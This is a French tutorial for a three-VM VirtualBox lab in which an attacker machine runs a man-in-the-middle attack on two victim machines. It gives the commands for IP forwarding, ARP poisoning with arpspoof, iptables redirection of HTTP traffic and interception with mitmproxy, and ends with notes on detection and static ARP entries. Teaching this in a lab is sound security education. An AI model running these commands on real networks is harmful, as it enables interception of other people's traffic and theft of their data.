### Tutoriel Complet pour une Attaque Man-in-the-Middle avec Ubuntu 22.04 et VirtualBox

Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque Man-in-the-Middle (MITM) avec Ubuntu 22.04 sur VirtualBox, incluant toutes les étapes nécessaires, les configurations réseau, et les commandes.

### Pré-requis

- **Logiciel de virtualisation** : VirtualBox (téléchargeable depuis [ici](https://www.virtualbox.org/))
- **Système d'exploitation** : Ubuntu 22.04 LTS (téléchargeable depuis [ici](https://ubuntu.com/download/desktop))
- **Trois machines virtuelles** : Une machine attaquante et deux machines victimes

### Configuration des Machines Virtuelles dans VirtualBox

#### Types de Machines

1. **Machine Attaquant (Attacker)** : Utilisée pour exécuter l'attaque MITM
2. **Machine Victime 1 (Victim 1)** : Première cible de l'attaque
3. **Machine Victime 2 (Victim 2)** : Deuxième cible de l'attaque

#### Création des Machines Virtuelles

1. **Créer une nouvelle machine virtuelle** pour chaque rôle (Attacker, Victim1, Victim2) :
   - **Nom** : Attacker, Victim1, Victim2
   - **Type** : Linux
   - **Version** : Ubuntu (64-bit)
   - **Mémoire** : 2048 MB (recommandé)
   - **Disque dur** : Créez un disque virtuel (au moins 20 Go)

2. **Installer Ubuntu 22.04** sur chaque machine virtuelle :
   - Démarrez chaque machine virtuelle avec l'ISO d'Ubuntu pour l'installation.
   - Suivez les instructions d'installation d'Ubuntu.

### Configuration du Réseau

#### Configuration du Réseau avec Double Adaptateur

1. **Configurer les adaptateurs réseau** pour chaque machine dans VirtualBox :
   - **Machine Attaquant (Attacker)** :
     - Adapter 1 : Bridge Adapter (pour la connexion à Internet via DHCP)
     - Adapter 2 : Internal Network (nommé `intnet`)
   - **Machine Victime 1 (Victim 1)** et **Machine Victime 2 (Victim 2)** :
     - Adapter 1 : Bridge Adapter (pour la connexion à Internet via DHCP)
     - Adapter 2 : Internal Network (nommé `intnet`)

#### Configuration des Adresses IP Statiques pour le Réseau Interne

1. **Attribuer des adresses IP statiques** sur l'interface interne (enp0s8) :

   - Pour la machine `Attacker` :
     - Ouvrez un terminal et éditez le fichier `/etc/netplan/00-installer-config.yaml` :
       ```yaml
       network:
         version: 2
         ethernets:
           enp0s3:
             dhcp4: true
           enp0s8:
             dhcp4: no
             addresses:
               - 192.168.1.10/24
             nameservers:
               addresses:
                 - 8.8.8.8
       ```
     - Appliquez les changements :
       ```sh
       sudo netplan apply
       ```

   - Pour la machine `Victim1` :
     - Éditez le fichier `/etc/netplan/00-installer-config.yaml` :
       ```yaml
       network:
         version: 2
         ethernets:
           enp0s3:
             dhcp4: true
           enp0s8:
             dhcp4: no
             addresses:
               - 192.168.1.20/24
             nameservers:
               addresses:
                 - 8.8.8.8
             routes:
               - to: default
                 via: 192.168.1.10
       ```
     - Appliquez les changements :
       ```sh
       sudo netplan apply
       ```

   - Pour la machine `Victim2` :
     - Éditez le fichier `/etc/netplan/00-installer-config.yaml` :
       ```yaml
       network:
         version: 2
         ethernets:
           enp0s3:
             dhcp4: true
           enp0s8:
             dhcp4: no
             addresses:
               - 192.168.1.30/24
             nameservers:
               addresses:
                 - 8.8.8.8
             routes:
               - to: default
                 via: 192.168.1.10
       ```
     - Appliquez les changements :
       ```sh
       sudo netplan apply
       ```

2. **Vérifiez la connectivité entre les machines** en utilisant `ping` :
   - Depuis `Attacker` :
     ```sh
     ping 192.168.1.20
     ping 192.168.1.30
     ```
   - Depuis `Victim1` :
     ```sh
     ping 192.168.1.10
     ping 192.168.1.30
     ```
   - Depuis `Victim2` :
     ```sh
     ping 192.168.1.10
     ping 192.168.1.20
     ```

### Installation des Outils Nécessaires

#### Sur la Machine Attaquant (Attacker)

1. **Mettre à jour le système** :
   ```sh
   sudo apt update && sudo apt upgrade -y
   ```

2. **Installer les outils nécessaires** :
   ```sh
   sudo apt install dsniff ettercap-text-only iptables mitmproxy -y
   ```

3. **Activer le transfert de paquets IP** :
   ```sh
   echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
   ```

#### Sur les Machines Victimes (Victim1 et Victim2)

1. **Mettre à jour le système** :
   ```sh
   sudo apt update && sudo apt upgrade -y
   ```

### Étape 1 : Empoisonner les Tables ARP

1. **Empoisonner la Table ARP de Victim1**

   - Exécutez la commande suivante sur la machine attaquant (`attacker`) :
     ```sh
     sudo arpspoof -i enp0s8 -t 192.168.1.20 192.168.1.30
     ```

2. **Empoisonner la Table ARP de Victim2**

   - Ouvrez un nouveau terminal sur `attacker`.
   - Exécutez la commande suivante :
     ```sh
     sudo arpspoof -i enp0s8 -t 192.168.1.30 192.168.1.20
     ```

### Étape 2 : Configurer `iptables` pour Rediriger le Trafic HTTP

1. **Ouvrez un nouveau terminal sur `attacker`**.
2. **Exécutez la commande suivante pour rediriger le trafic HTTP vers `mitmproxy`** :
   ```sh
   sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
   ```

### Étape 3 : Lancer un Proxy MITM

1. **Sur la machine attaquant, lancez `mitmproxy`** :
   ```sh
   sudo mitmproxy -p 8080
   ```

### Vérification et Conclusion

1. **Tester l'Attaque** :
   - Sur `Victim1`, ouvrez un navigateur et accédez à un site web HTTP (non HTTPS).
   - Sur `attacker`, vous devriez voir le trafic intercepté dans `mitmproxy`.

2. **Arrêter l'Attaque** :
   - Arrêtez `arpspoof` et `mitmproxy` en utilisant `Ctrl + C`.
   - Réinitialisez les règles `iptables` :
     ```sh
     sudo iptables -t nat -F
     ```

### Résumé des Commandes

#### Machine Attaquant (Attacker)

```sh
# Activer le transfert IP
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Empoisonner les tables ARP
sudo arpspoof -i enp0s8 -t 192.168.1.20 192.168.1.30
sudo arpspoof -i enp0s8 -t 192.168.1.30 192.168.1.20

# Rediriger le trafic HTTP
sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080

# Lancer mitmproxy
sudo mitmproxy -p 8080

# Réinitialiser les règles iptables
sudo iptables -t nat -F
```

### Théorie et Explications Vulgarisées

#### Qu'est-ce qu'une Attaque Man-in-the-Middle (MITM) ?

Imaginez deux amis, Alice (Victim1) et Bob (Victim2), qui échangent des lettres. Mallory (Attacker) est un individu malveillant qui intercepte et lit toutes les lettres échangées entre Alice et Bob, et parfois il modifie le contenu des lettres avant de

 les envoyer à la destination prévue. Une attaque Man-in-the-Middle fonctionne de manière similaire en interceptant les communications entre deux parties.

#### Comment l'Attaque Fonctionne-t-elle ?

1. **Empoisonnement ARP** :
   - Mallory trompe Alice et Bob en leur faisant croire que son adresse (adresse MAC de Mallory) est celle de l'autre.
   - Résultat : Tout le trafic entre Alice et Bob passe par Mallory.

2. **Redirection du Trafic** :
   - Mallory redirige tout le trafic HTTP vers un proxy (mitmproxy) pour inspecter et éventuellement modifier les communications.

#### Détection et Mitigation

1. **Utiliser Wireshark pour Détecter** :
   - Wireshark est comme une caméra de sécurité qui enregistre tout ce qui se passe sur le réseau.
   - Vous pouvez capturer et analyser les paquets ARP pour détecter des anomalies.

2. **Configurer des Entrées ARP Statiques** :
   - Ajouter des entrées ARP statiques est comme fixer des étiquettes sur les boîtes aux lettres pour que les lettres (paquets) aillent toujours au bon endroit.
   - Utilisez les commandes `arp` pour ajouter des entrées ARP statiques sur les machines victimes.

En suivant ces étapes, vous pouvez configurer, exécuter et comprendre une attaque Man-in-the-Middle, tout en apprenant comment détecter et mitiger de telles attaques pour assurer la sécurité de votre réseau.
